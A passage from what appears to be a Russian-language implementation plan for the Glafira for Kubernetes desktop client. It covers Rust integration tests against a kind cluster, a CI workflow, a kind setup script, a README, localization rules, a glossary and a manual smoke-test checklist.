        eprintln!("GO_IT_KUBECONFIG не задан — интеграционный тест пропущен");
    }
    p
}

/// Подключение из контекста kubeconfig — так же, как импорт в приложении.
fn import(path: &Path, context: &str) -> (ConnectionProfile, Arc<MemoryStore>) {
    let kc = kubeconfig::read(path).unwrap();
    let preview = kubeconfig::preview(&kc, path, &[], &PolicyStatus::default(), &|_, _| None);
    let ctx = preview
        .contexts
        .iter()
        .find(|c| c.name == context)
        .unwrap_or_else(|| panic!("нет контекста {context}"));
    let imported = kubeconfig::import_context(&kc, context, ctx).unwrap();
    let secrets = Arc::new(MemoryStore::default());
    if let Some(t) = &imported.token {
        secrets
            .set(&secret_key(&imported.profile.id, TOKEN), t)
            .unwrap();
    }
    if let Some(k) = &imported.client_key {
        secrets
            .set(&secret_key(&imported.profile.id, CLIENT_KEY), k)
            .unwrap();
    }
    (imported.profile, secrets)
}

fn steps(r: &connectivity::TestReport) -> Vec<(&str, bool)> {
    r.steps.iter().map(|s| (s.name, s.ok)).collect()
}

#[tokio::test]
async fn admin_certificate_passes_every_step() {
    let Some(path) = kubeconfig_path() else {
        return;
    };
    let (profile, secrets) = import(&path, "admin");
    let r = test(&profile, secrets.clone()).await;
    assert!(r.ok, "{:#?}", r.steps);
    assert_eq!(
        steps(&r),
        [
            ("config", true),
            ("tcp", true),
            ("tls", true),
            ("auth", true),
            ("discovery", true),
            ("projects", true)
        ]
    );
    assert_eq!(r.steps[4].message.key, "messages.connectionTest.discovery");
    assert!(r.steps[4].message.params["platform"].starts_with("Kubernetes 1."));
    let c = pool::open(profile, secrets, no_cancel()).await.unwrap();
    assert_eq!(c.info.platform.kind, PlatformKind::Kubernetes);
    assert_eq!(
        c.info.platform.distribution, None,
        "kind — без дистрибутива"
    );
    assert!(!c.info.api_groups.routes && !c.info.api_groups.projects);
    assert!(
        c.info.capabilities.list_nodes,
        "у администратора kind есть права на ноды"
    );
    assert!(c.info.server_version.starts_with('v'));
}

#[tokio::test]
async fn service_account_sees_only_its_project() {
    let Some(path) = kubeconfig_path() else {
        return;
    };
    let (mut profile, secrets) = import(&path, "dev-token");
    assert_eq!(profile.favorite_namespaces, vec!["team-a"]);
    let r = test(&profile, secrets.clone()).await;
    assert_eq!(r.steps.last().unwrap().name, "projects");
    assert!(
        !r.ok,
        "список namespace учётной записи недоступен: {:#?}",
        r.steps
    );
    assert_eq!(
        r.steps.last().unwrap().error.as_ref().unwrap().code,
        ErrorCode::Forbidden
    );
    profile.manual_namespaces = vec!["team-a".into()];
    let r = test(&profile, secrets.clone()).await;
    assert!(r.ok, "{:#?}", r.steps);
    let c = pool::open(profile, secrets, no_cancel()).await.unwrap();
    assert_eq!(c.info.user, "system:serviceaccount:team-a:glafira-dev");
    assert!(!c.info.capabilities.list_nodes);
    assert!(!c.info.capabilities.list_projects);
}

#[tokio::test]
async fn wrong_token_fails_the_sign_in_step() {
    let Some(path) = kubeconfig_path() else {
        return;
    };
    let (profile, secrets) = import(&path, "dev-token");
    secrets
        .set(&secret_key(&profile.id, TOKEN), "not-a-token")
        .unwrap();
    let r = test(&profile, secrets.clone()).await;
    assert_eq!(steps(&r).last().copied(), Some(("auth", false)));
    assert_eq!(
        r.steps.last().unwrap().error.as_ref().unwrap().code,
        ErrorCode::SessionExpired
    );
    let e = pool::open(profile, secrets, no_cancel())
        .await
        .err()
        .unwrap();
    assert_eq!(e.code, ErrorCode::SessionExpired);
}

/// Exec-плагин против настоящего API-сервера: скрипт с именем `kubectl` (`oidc-login get-token`)
/// выдаёт токен сервисной учётной записи.
#[cfg(unix)]
#[tokio::test]
async fn exec_plugin_token_signs_in() {
    use glafira_kubernetes_lib::auth::exec::fingerprint;
    use glafira_kubernetes_lib::storage::profile::{AuthConfig, ExecAuth, ExecEnv};
    use std::os::unix::fs::PermissionsExt;
    let Some(path) = kubeconfig_path() else {
        return;
    };
    let (mut profile, secrets) = import(&path, "dev-token");
    let token = secrets
        .get(&secret_key(&profile.id, TOKEN))
        .unwrap()
        .unwrap();
    let dir = tempfile::tempdir().unwrap();
    let plugin = dir.path().join("kubectl");
    std::fs::write(
        &plugin,
        "#!/bin/sh\nprintf '{\"kind\":\"ExecCredential\",\"status\":{\"token\":\"%s\"}}' \"$SA_TOKEN\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&plugin, std::fs::Permissions::from_mode(0o755)).unwrap();
    let mut exec = ExecAuth {
        command: plugin.display().to_string(),
        args: vec!["oidc-login".into(), "get-token".into()],
        env: vec![ExecEnv {
            name: "SA_TOKEN".into(),
            value: token,
        }],
        api_version: "client.authentication.k8s.io/v1".into(),
        provide_cluster_info: false,
        approved: None,
    };
    exec.approved = Some(fingerprint(&exec));
    profile.auth = AuthConfig::Exec(exec);
    profile.manual_namespaces = vec!["team-a".into()];
    let secrets = Arc::new(MemoryStore::default());
    let r = test(&profile, secrets.clone()).await;
    assert!(r.ok, "{:#?}", r.steps);
    assert_eq!(steps(&r)[2], ("exec", true));
    let c = pool::open(profile, secrets, no_cancel()).await.unwrap();
    assert_eq!(c.info.user, "system:serviceaccount:team-a:glafira-dev");
}
````

Применить: `python3 /tmp/o1a-blocks.py step 19.2`.

- [ ] **Step 3: Реализация.**

<!-- block: file t19-github-funding-yml step=19.3 path=.github/FUNDING.yml -->
````yaml
github: vvnovg
custom: ["https://github.com/vvnovg/glafira-kubernetes-releases/blob/main/SUPPORT.md"]
````

<!-- block: file t19-github-workflows-ci-yml step=19.3 path=.github/workflows/ci.yml -->
````yaml
name: ci

on:
  push:
    branches: [main]
    tags: ["v*"]
  pull_request:
  workflow_dispatch:

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  linux:
    runs-on: ubuntu-22.04
    env:
      # Номеров строк в backtrace достаточно; полная отладочная информация раздувает тестовые бинарники.
      CARGO_PROFILE_DEV_DEBUG: line-tables-only
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
        with:
          version: 11
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 22
          cache: pnpm
      - uses: dtolnay/rust-toolchain@b725eda525362e7cf34af9a7243cac1e3f01a7ec # ветка stable
        with:
          components: clippy, rustfmt
      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
        with:
          workspaces: src-tauri -> target
      - name: Системные зависимости Tauri
        run: |
          sudo apt-get update
          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf libsecret-1-dev
      - run: pnpm install --frozen-lockfile
      - run: pnpm test
      - run: pnpm test:scripts
      - run: pnpm i18n:check
      - run: pnpm build
      - run: cargo fmt --manifest-path src-tauri/Cargo.toml --check
      - run: cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings
      - name: Лицензии и уязвимости зависимостей (cargo deny, deny.toml)
        run: |
          cargo deny --version 2>/dev/null | grep -q ' 0\.20\.2$' || cargo install cargo-deny --locked --version 0.20.2 --force
          cargo deny --manifest-path src-tauri/Cargo.toml --config deny.toml check licenses advisories
      - name: Кластер kind
        uses: helm/kind-action@1544676c07bb3570fcb70166beaa07c4528fd4aa # v1.15.1
        with:
          version: v0.33.0
          cluster_name: glafira
      - name: Учётные записи стенда
        run: dev/kind/setup.sh
      - name: Тесты Rust (unit + интеграционные)
        run: cargo test --manifest-path src-tauri/Cargo.toml --lib --tests
        env:
          GO_IT_KUBECONFIG: ${{ github.workspace }}/dev/kind/out/kubeconfig

  platforms:
    if: github.event_name == 'workflow_dispatch' || startsWith(github.ref, 'refs/tags/')
    strategy:
      fail-fast: false
      matrix:
        os: [macos-14, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
      - uses: pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4
        with:
          version: 11
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: 22
          cache: pnpm
      - uses: dtolnay/rust-toolchain@b725eda525362e7cf34af9a7243cac1e3f01a7ec # ветка stable
        with:
          components: clippy
      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2.9.2
        with:
          workspaces: src-tauri -> target
      - run: pnpm install --frozen-lockfile
      - run: pnpm test
      - run: pnpm build
      - name: Unit-тесты Rust
        run: cargo test --manifest-path src-tauri/Cargo.toml --lib
````

<!-- block: file t19-dev-kind-readme-md step=19.3 path=dev/kind/README.md -->
````markdown
# Стенд kind

Обычный Kubernetes в Docker для интеграционных тестов Rust: Glafira проверяет на нём подключение, вход
(сертификат, токен и exec-плагин — скрипт, который выдаёт токен сервисной учётной записи), платформу `kubernetes`,
права и импорт kubeconfig. Особенностей OpenShift (проекты, OAuth, маршруты) на kind нет — их проверяет смоук
на OpenShift Local или dev-кластере (`docs/smoke/o1a.md`).

```bash
brew install kind            # или https://kind.sigs.k8s.io/docs/user/quick-start/
kind create cluster --name glafira
dev/kind/setup.sh
GO_IT_KUBECONFIG="$PWD/dev/kind/out/kubeconfig" cargo test --manifest-path src-tauri/Cargo.toml --tests
kind delete cluster --name glafira
```

`dev/kind/out/` в git не попадает: в kubeconfig — ключ администратора кластера и токен.
````

<!-- block: file t19-dev-kind-setup-sh step=19.3 path=dev/kind/setup.sh mode=755 -->
````bash
#!/usr/bin/env bash
# Стенд интеграционных тестов на kind: проект team-a, сервисная учётная запись glafira-dev с ролью edit
# только в нём и kubeconfig dev/kind/out/kubeconfig с контекстами admin (сертификат kind) и dev-token
# (токен glafira-dev, проект team-a). Перед запуском: kind create cluster --name glafira
set -euo pipefail
cluster="${KIND_CLUSTER:-glafira}"
out="$(cd "$(dirname "$0")" && pwd)/out"
ctx="kind-$cluster"
k() { kubectl --context "$ctx" "$@"; }
mkdir -p "$out"
k create namespace team-a --dry-run=client -o yaml | k apply -f -
k -n team-a create serviceaccount glafira-dev --dry-run=client -o yaml | k apply -f -
k -n team-a create rolebinding glafira-dev-edit --clusterrole=edit --serviceaccount=team-a:glafira-dev \
  --dry-run=client -o yaml | k apply -f -
token="$(k -n team-a create token glafira-dev --duration=24h)"
kind get kubeconfig --name "$cluster" > "$out/kubeconfig"
chmod 600 "$out/kubeconfig"
export KUBECONFIG="$out/kubeconfig"
kubectl config rename-context "$ctx" admin
kubectl config set-credentials glafira-dev --token="$token"
kubectl config set-context dev-token --cluster="$ctx" --user=glafira-dev --namespace=team-a
echo "kubeconfig: $out/kubeconfig (контексты admin и dev-token)"
````

<!-- block: patch t19-src step=19.3 -->
````diff
diff --git a/.gitignore b/.gitignore
--- a/.gitignore
+++ b/.gitignore
@@ -26,3 +26,6 @@ dist-ssr
 
 # Экспорты подключений (без паролей, но с адресами реальных кластеров)
 *.glafira-kubernetes-connections.json
+
+# Стенд kind: kubeconfig с ключом администратора и токеном
+dev/kind/out/
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -123,3 +123,6 @@
 | `src/components/Sidebar.tsx` | `src/components/Sidebar.tsx` | `8bbd0bd` | адаптирован: без индикатора MCP |
 | `src/components/Sidebar.test.tsx` | `src/components/Sidebar.test.tsx` | `8bbd0bd` | адаптирован: пункты подключения O1 |
 | `src/components/TabContent.tsx` | `src/components/TabContent.tsx` | `8bbd0bd` | адаптирован: вкладки O1 |
+| `deny.toml` | `deny.toml` | `8bbd0bd` | адаптирован: без C-библиотек librdkafka и OpenSSL |
+| `.github/FUNDING.yml` | `.github/FUNDING.yml` | `8bbd0bd` | адаптирован: адрес поддержки |
+| `.github/workflows/ci.yml` | `.github/workflows/ci.yml` | `8bbd0bd` | адаптирован: без Kafka и MCP-крейта, стенд kind |
````

Применить: `python3 /tmp/o1a-blocks.py step 19.3`.

- [ ] **Step 4: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 182 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

Run: `cargo test --manifest-path src-tauri/Cargo.toml --tests`  
Expected: PASS — unit-тестов 182, интеграционных: `it_connect` — 4 (без `GO_IT_KUBECONFIG` тела тестов пропускаются)

Run: `cargo deny --manifest-path src-tauri/Cargo.toml --config deny.toml check licenses advisories`  
Expected: PASS — `licenses ok`, `advisories ok`

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "test(ci): интеграционные тесты на kind, CI, cargo deny" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 20: Документация: README, правила локализации, глоссарий, смоук

**Files:**
- Create: `README.md`, `docs/i18n/README.md`, `docs/i18n/glossary.md`, `docs/smoke/o1a.md`
- Modify: `PORTED.md`

**Interfaces:**
- Consumes: всё предыдущее.
- Produces: документы.

README для разработчика (запуск, тесты, подключения, exec-плагины, платформа, данные, политика), `docs/i18n/README.md` (как добавлять строки фрагментами), глоссарий терминов (en, ru: платформа, дистрибутив, exec-плагин, строка запуска; виды ресурсов, в том числе Ingress и Gateway API, не переводятся) и чек-лист ручного смоука `docs/smoke/o1a.md` на OpenShift Local или dev-кластере и на kind: вход через браузер и его отмена, страница токена, импорт kubeconfig, сертификат и права на kind, платформа и группы API, exec-плагин из kubeconfig и из формы (OIDC или облачный), TLS и прокси, политика с `allowExecAuth`, папки и обмен, prod, удаление, язык и справка.

- [ ] **Step 1: Реализация.**

<!-- block: file t20-readme-md step=20.1 path=README.md -->
````markdown
# Glafira for Kubernetes

Desktop-приложение (Tauri 2 + Rust + React) для работы с кластерами Kubernetes и их диагностики; в фокусе —
OpenShift и Platform V DropApp.

Kubernetes is a registered trademark of The Linux Foundation. OpenShift is a trademark of Red Hat, Inc. Platform V
and DropApp are trademarks of their respective owners. This project is not affiliated with The Linux Foundation,
Red Hat or SberTech.

Спецификация: `docs/superpowers/specs/2026-10-24-glafira-kubernetes-design.md`. Код, общий с Glafira for Apache Kafka,
перечислен в `PORTED.md`.

## Требования
- Rust stable (`rustup`), Xcode Command Line Tools (macOS)
- Node 22+, pnpm 11
- Для интеграционных тестов — Docker и kind (`dev/kind/README.md`)

## Запуск
```bash
pnpm install
pnpm tauri dev
```

## Тесты
```bash
pnpm test                                              # фронтенд
pnpm test:scripts                                      # скрипты scripts/*.mjs
pnpm i18n:check                                        # словари, ключи Rust, руководство
cargo test --manifest-path src-tauri/Cargo.toml --lib  # Rust unit
GO_IT_KUBECONFIG="$PWD/dev/kind/out/kubeconfig" cargo test --manifest-path src-tauri/Cargo.toml --tests  # интеграционные (kind)
```
Без `GO_IT_KUBECONFIG` интеграционные тесты пропускаются.

## Подключения
- Адрес API-сервера: `https://api.<кластер>:6443`; допускается путь (прокси Rancher `…/k8s/clusters/<id>`).
- Способы входа: через браузер (OAuth OpenShift, как `oc login --web`; только OpenShift), токен (`oc whoami -t` или
  токен сервисной учётной записи), клиентский сертификат PEM, exec-плагин из списка разрешённых (`aws`,
  `aws-iam-authenticator`, `gke-gcloud-auth-plugin`, `kubelogin`, `kubectl oidc-login`, `oc`, `yc`, `rancher` —
  `src-tauri/src/auth/exec.rs`). Если на кластере нет OAuth-клиента `openshift-cli-client`, вкладка подключения
  открывает страницу токена кластера (`/oauth/token/request`).
- Exec-плагин запускает Glafira (не `kube`): по абсолютному пути, без оболочки, с PATH оболочки входа, не дольше
  5 минут, с отменой; строку запуска подтверждает человек, изменённая строка требует нового подтверждения.
- Импорт из kubeconfig (`KUBECONFIG` или `~/.kube/config`): токены и ключи — в keychain, CA, проект контекста
  и строка запуска exec-плагина — в профиль. Контексты с `auth-provider` и exec-плагинами вне списка не импортируются.
- CA: системное хранилище ОС или только перечисленные сертификаты PEM; режим без проверки сертификата можно
  запретить политикой `allowInsecureTls`, exec-плагины — политикой `allowExecAuth`.
- Платформа (`src-tauri/src/platform/`): `openshift` по группе `config.openshift.io`, иначе `kubernetes`
  с дистрибутивом (EKS, GKE, AKS, Rancher, Deckhouse, k3s, RKE2); объекты показываются по группам API.
- Проверка подключения по шагам: конфигурация → DNS/TCP → [exec-плагин] → TLS → вход → платформа → проекты.

## Где хранятся данные
- Профили и папки: `connections.json` в каталоге данных (macOS: `~/Library/Application Support/io.github.vvnovg.glafira.kubernetes/`).
- Токены и ключи клиентских сертификатов — в системном хранилище секретов, сервис `glafira-kubernetes`.
- Настройки: `settings.json`. Файлы — с правами только для владельца (0600 на macOS и Linux).
- Экспорт подключений — файл `*.glafira-kubernetes-connections.json` без токенов и ключей.
- Логи: `RUST_LOG=debug pnpm tauri dev`; файлы — в папке логов ОС (путь — в «О программе»).

## Политика администратора
Ключи `updatesEnabled`, `updateUrl`, `language`, `mcpEnabled`, `allowInsecureTls`, `allowExecAuth`; примеры —
`docs/admin/`.

## Языки
Интерфейс и руководство — на английском и русском; остальные 10 языков Kafka-версии добавляет этап O6.
Как добавить строку — `docs/i18n/README.md`.

## Лицензия и поддержка проекта
- Код открыт под [Apache License 2.0](LICENSE). Имя Glafira и значок лицензией не покрываются — см. `TRADEMARK.md`.
- Пункт «Поддержать проект» ведёт на https://github.com/vvnovg/glafira-kubernetes-releases/blob/main/SUPPORT.md.
- Как участвовать — `CONTRIBUTING.md`; об уязвимостях — `SECURITY.md`.
````

<!-- block: file t20-docs-i18n-readme-md step=20.1 path=docs/i18n/README.md -->
````markdown
# Локализация (i18n)

Интерфейс и тексты Rust локализуются через словари `src/locales/<код>.json`: `en` — эталон ключей и параметров,
`ru` — эталон смысла. До этапа O6 словарей два; остальные 10 языков Kafka-версии добавляются по правилам ниже.
Термины — [glossary.md](glossary.md).

## Соглашение о ключах
- Вложенные объекты, ключи в camelCase: `<область>.<экран/компонент>.<смысл>`, например `connections.form.apiUrl`.
- Общие тексты — в `common.*`; ошибки из Rust — в `errors.<модуль>.<смысл>`.
- Параметры — `{{name}}`, одинаковые во всех словарях; фраза целиком — один ключ.
- Видимые подписи обязательны: `aria-label`, `title`, `placeholder` тоже идут через словарь.

## Как добавить строку
1. В компоненте: `const { t } = useTranslation();` и `t("область.экран.смысл", { param })`.
2. Добавить ключ в оба словаря. Удобно фрагментом: `node scripts/merge-locales.mjs < fragment.json`, где
   `fragment.json` — `{"en": {...}, "ru": {...}}`; ключ с другим значением скрипт не перезапишет без `--replace`.
   Если перевод намеренно совпадает с английским (`TLS`, `DNS / TCP`), добавить ключ в `docs/i18n/same-as-en.json`.
3. `pnpm i18n:check`.

## Плюралы
Число рядом с существительным — только через `count` и суффиксы `_one`, `_few`, `_many`, `_other`
(en — `one`/`other`; ru — `one`/`few`/`many`/`other`). Подписи вида «проектов: N» плюрала не требуют.

## Тексты из Rust
- `app_err!(ErrorCode::X, "errors.m.y", "English {{p}}", p = value)` — ошибка с кодом; `ltext!("errors.m.y", "English {{p}}", p = value)` — текст.
- В IPC уходит `{ key, params, text }`: `text` — английский запасной вариант (его же пишут в лог).
- На фронтенде `tr(x)` (`src/i18n/text.ts`) переводит по ключу, а если ключа нет — показывает `text`.
- `LocalizedText::raw(..)` — только технический текст (сообщение API-сервера), который нельзя перевести.
- Кириллица в строковых литералах Rust вне тестов запрещена: тексты — только через словари.

## Проверки
`pnpm i18n:check` = `node scripts/i18n-check.mjs --rust-cyrillic src-tauri/src`: одинаковые ключи, параметры и
теги во всех словарях; плюральные формы; строки, совпадающие с en, — только из `docs/i18n/same-as-en.json`;
ключи `ltext!`/`app_err!` и их английский текст; ключи фронтенда; подсказки; главы руководства; кириллица в коде.
С этапа O6 — флаг `--require-all-languages`.

## Подсказки
`<Hint k="hints.<экран>.<поле>" label={t("…подпись…")} />` (`src/components/common/Hint.tsx`) — рядом с подписью
в `<span className="field-label">`, не внутри `<label>`. 1–2 фразы, en — не длиннее 200 символов; параметры и
значения — в `<code>`.

## Руководство
Главы — `docs/guide/<код>/<глава>.md`; набор — `GUIDE_CHAPTERS` в `scripts/i18n-check.mjs` и `src/guide/chapters.ts`.
Глава начинается с `# Заголовок`, разделы — `## Заголовок {#id}` (id одинаковые во всех языках), элементы
интерфейса — метками `[[ui:ключ]]` (ключ без `{{…}}`), ссылки между главами — `[текст](глава.md#якорь)`.
````

<!-- block: file t20-docs-i18n-glossary-md step=20.1 path=docs/i18n/glossary.md -->
````markdown
# Глоссарий переводов Glafira for Kubernetes

Единые решения по терминам. Эталон ключей и параметров — `en.json`, эталон смысла — `ru.json`. Меняя решение,
исправьте его во всех словарях одним коммитом. Общие правила стиля — как в Glafira for Apache Kafka: коротко и
нейтрально, параметры `{{…}}` и теги `<code>` не переводятся, многоточие — `…`, тире — `—`.

## Не переводится
OpenShift, OKD, Kubernetes, Platform V DropApp, Glafira, OAuth, OIDC, TLS, PEM, DNS, TCP, CA, API, URL, JSON, MCP,
LLM, kubeconfig, `oc`, `kubectl`; названия дистрибутивов (EKS, GKE, AKS, Rancher, Deckhouse, k3s, RKE2); названия
видов ресурсов (Pod, Deployment, StatefulSet, DaemonSet, DeploymentConfig, Job, CronJob, Route, Ingress, Gateway,
HTTPRoute, GRPCRoute, Service, ConfigMap, Secret, PVC, HPA, ResourceQuota, LimitRange, ClusterOperator) и групп API
(Gateway API); `request` / `limit` в значении полей ресурсов; команды, адреса и имена переменных (`HTTPS_PROXY`,
`NO_PROXY`, `oc login --web`, `interactiveMode`).

## Термины

| en | ru | Примечание |
|---|---|---|
| connection | подключение | |
| cluster | кластер | |
| project | проект | namespace OpenShift; «namespace» — только там, где речь об обычном Kubernetes |
| node | нода | |
| pod | под | в тексте; вид ресурса в таблицах — Pod |
| workload | workload | |
| sign in / sign-in | войти / вход | не «логин» |
| token | токен | |
| client certificate | клиентский сертификат | |
| trusted CA | доверенный CA | |
| certificate verification | проверка сертификата | |
| proxy | прокси | |
| read-only | только чтение | |
| environment | окружение | local, dev, test, stage, prod не переводятся |
| folder | папка | |
| session expired | сессия истекла | |
| rights / permissions | права | «нет прав: …» |
| connection check / test connection | проверка подключения / проверить подключение | |
| platform | платформа | OpenShift или Kubernetes (§4.3 спеки) |
| distribution | дистрибутив | EKS, GKE, Rancher… |
| exec plugin | exec-плагин | команда kubeconfig, которая выдаёт учётные данные |
| launch line | строка запуска | путь, аргументы и переменные exec-плагина |
| allow (to run a command) | разрешить (запуск) | подтверждение строки запуска |
````

<!-- block: file t20-docs-smoke-o1a-md step=20.1 path=docs/smoke/o1a.md -->
````markdown
# Смоук O1a (каркас и подключения)

Сборка: `pnpm tauri dev`. Кластеры: OpenShift Local (`crc start`, пользователи `kubeadmin` и `developer`) или
dev-кластер OpenShift; для kubeconfig — `oc login` в терминале заранее. Стенд kind (`dev/kind/README.md`) — для
пунктов про обычный Kubernetes. Для exec-плагина — кластер с входом через `kubectl oidc-login` (Keycloak, Dex)
или облачный (EKS — `aws`, GKE — `gke-gcloud-auth-plugin`, Yandex — `yc`), если он есть.

1. Первый запуск. В левой панели «Подключения» и подсказка «Добавьте первое подключение…»; в рабочей области
   «Выберите подключение слева или добавьте новое.». Внизу панели — «Настройки», «Поддержать проект», «Справка»,
   «О программе».
2. Вход через браузер. «+» → имя `crc`, адрес `https://api.crc.testing:6443`, «Способ входа» — «Браузер», CA —
   «Сертификаты (PEM)» с CA кластера (или «Не проверять» для OpenShift Local). «Проверить подключение»: шаг «Вход»
   неуспешен — «Войдите в кластер: кнопка «Войти через браузер»». «Сохранить» → вкладка подключения с ошибкой и
   кнопкой «Войти через браузер». Нажать: открывается браузер со страницей входа OpenShift, после входа страница
   «Signed in — return to Glafira», вкладка показывает «Вход выполнен как developer», платформу «OpenShift 4.x»
   (у `developer` без прав на ClusterVersion — просто «OpenShift»), «Найдено в кластере» — «Route, Project,
   DeploymentConfig», версию и права.
3. Отмена входа. `oc logout` с токеном Glafira (или подождать истечения), «Подключиться заново» → «Войти через
   браузер» и, не входя, «Отменить»: ошибка «Вход отменён»; вкладку браузера можно закрыть.
4. Страница токена. На кластере без `openshift-cli-client` (или по кнопке «Получить токен на странице кластера»)
   открывается `https://oauth-openshift.apps…/oauth/token/request`; скопировать токен, вставить в поле «Токен»,
   «Сохранить токен» → вкладка показывает пользователя.
5. Токен. Новое подключение, «Способ входа» — «Токен», вставить `oc whoami -t`. «Проверить подключение»: все шаги
   с ✅, у «Проекты» — число проектов. Неверный токен → ❌ на шаге «Вход» с текстом «Кластер отклонил учётные данные».
6. Импорт kubeconfig. Меню «⋯» → «Импорт из kubeconfig…»: путь `~/.kube/config`, текущий контекст отмечен, у
   контекстов с `auth-provider` или командой вне списка — причина и неактивный флажок. Импортировать в папку →
   «Импортировано N подключение»;
   у подключения в форме — проект контекста в «Избранные проекты», токен не показан (поле «оставьте пустым»).
   Повторный импорт того же контекста обновляет подключение («обновит существующее подключение»), не создаёт копию.
7. Клиентский сертификат (kind). Импорт контекста `admin` из `dev/kind/out/kubeconfig`: способ входа —
   «Клиентский сертификат», проверка — все шаги ✅, «Платформа» — «Kubernetes 1.x · API-сервер v1.x…»; на вкладке
   подключения «Найдено в кластере» — «—», пунктов «Операторы кластера» и «Версия кластера» нет. Вход через браузер
   на этом кластере → «На кластере нет OAuth-сервера OpenShift…».
8. Права. Контекст `dev-token` (kind): «Проекты» — ❌ «Нет прав: list namespaces на уровне кластера»; указать
   `team-a` в «Проекты (если список недоступен)» → ✅ «Кластер не отдаёт вам список проектов; проектов в профиле: 1».
   На вкладке подключения «Список проектов» и «Ноды» — «—».
9. TLS и прокси. Неверный CA → ❌ на шаге «TLS» «Сертификат сервера подписан недоверенным CA». Прокси «Адрес прокси»
   с несуществующим хостом → ❌ на шаге «DNS / TCP» «Не удаётся разрешить имя хоста сервера».
10. Политика. Положить `docs/admin/policy.json` в `/etc/io.github.vvnovg.glafira.kubernetes/policy.json` (Linux) или
    профиль `docs/admin/policy.mobileconfig` (macOS), перезапустить: в форме варианты «Не проверять (небезопасно)»
    и «Exec-плагин» недоступны, сохранение и подключение с ними — ошибка «запрещены вашей организацией», в импорте
    kubeconfig контексты с exec-плагином неактивны; в «О программе» — «Политика организации: задана». Убрать
    политику.
11. Папки, экспорт и импорт. Новая папка, перетаскивание подключения, «Экспортировать всё…» → файл
    `glafira-kubernetes-connections-<дата>.glafira-kubernetes-connections.json` без токенов (`grep sha256~` пуст);
    «Импортировать…» на другом профиле ОС → «После импорта введите токены или ключи для N подключений».
12. Prod. Окружение `prod` у нового подключения → флажок «Только чтение» отмечен, бейдж PROD красный, во вкладке —
    замок.
13. Удаление. «Удалить» в форме → «Удалить подключение «…»?» → «Да, удалить»: вкладки подключения закрыты, запись
    в keychain (`glafira-kubernetes`, `<id>/token`) удалена.
14. Язык и справка. «Настройки» → «Язык интерфейса» → English: интерфейс на английском без перезапуска. F1 на форме
    подключения — глава «Подключения»; поиск «kubeconfig» в справке находит раздел «Импорт из kubeconfig».
    Меню Help (macOS): «Руководство Glafira», «Поддержать проект», «О программе».
15. Данные. `~/Library/Application Support/io.github.vvnovg.glafira.kubernetes/connections.json` — `-rw-------`,
    без токенов и ключей.
16. Exec-плагин из kubeconfig. Импорт контекста с `kubectl oidc-login` (или `aws eks get-token`): в диалоге — строка
    запуска с полным путём (`/opt/homebrew/bin/kubectl …`), без флажка «Разрешить Glafira запускать эту команду»
    кнопка импорта неактивна. После импорта вкладка подключения: «Ожидание exec-плагина…», плагин открывает
    браузер, после входа — пользователь OIDC и платформа. «Отменить» во время ожидания → «Вход отменён».
17. Exec-плагин в форме. «Способ входа» — «Exec-плагин», команда `kubelogin` → «Найти» подставляет полный путь;
    переменная `OIDC_CLIENT_SECRET=…` в строке запуска скрыта (`••••`). «Проверить подключение» неактивна до
    подтверждения; после — шаг «Exec-плагин» ✅ со сроком учётных данных. Изменить аргумент и сохранить без
    подтверждения → вкладка подключения: «Подтвердите строку запуска exec-плагина…» и «Изменить подключение».
    Команда вне списка (`/bin/sh`) — ошибка «нет в списке разрешённых exec-плагинов».
18. Платформы. Кластер Kubernetes с Gateway API (kind с CRD Gateway API standard channel или облачный) — «Найдено
    в кластере: Gateway API»; EKS, GKE или k3s — дистрибутив в скобках («Kubernetes 1.31 (EKS)»). Адрес через прокси
    Rancher (`https://rancher…/k8s/clusters/c-…`), если есть: проверка проходит, платформа — «Kubernetes … (Rancher)»
    или по дистрибутиву нижележащего кластера.
````

<!-- block: patch t20-src step=20.1 -->
````diff
diff --git a/PORTED.md b/PORTED.md
--- a/PORTED.md
+++ b/PORTED.md
@@ -126,3 +126,5 @@
 | `deny.toml` | `deny.toml` | `8bbd0bd` | адаптирован: без C-библиотек librdkafka и OpenSSL |
 | `.github/FUNDING.yml` | `.github/FUNDING.yml` | `8bbd0bd` | адаптирован: адрес поддержки |
 | `.github/workflows/ci.yml` | `.github/workflows/ci.yml` | `8bbd0bd` | адаптирован: без Kafka и MCP-крейта, стенд kind |
+| `docs/i18n/README.md` | `docs/i18n/README.md` | `8bbd0bd` | адаптирован: языки en и ru, без Kafka |
+| `docs/i18n/glossary.md` | `docs/i18n/glossary.md` | `8bbd0bd` | адаптирован: термины Kubernetes и OpenShift, en и ru |
````

Применить: `python3 /tmp/o1a-blocks.py step 20.1`.

- [ ] **Step 2: Проверки.**

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

- [ ] **Step 3: Commit.**

```bash
git add -A
git commit -s -m "docs: README, правила локализации, глоссарий, чек-лист смоука O1a" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```
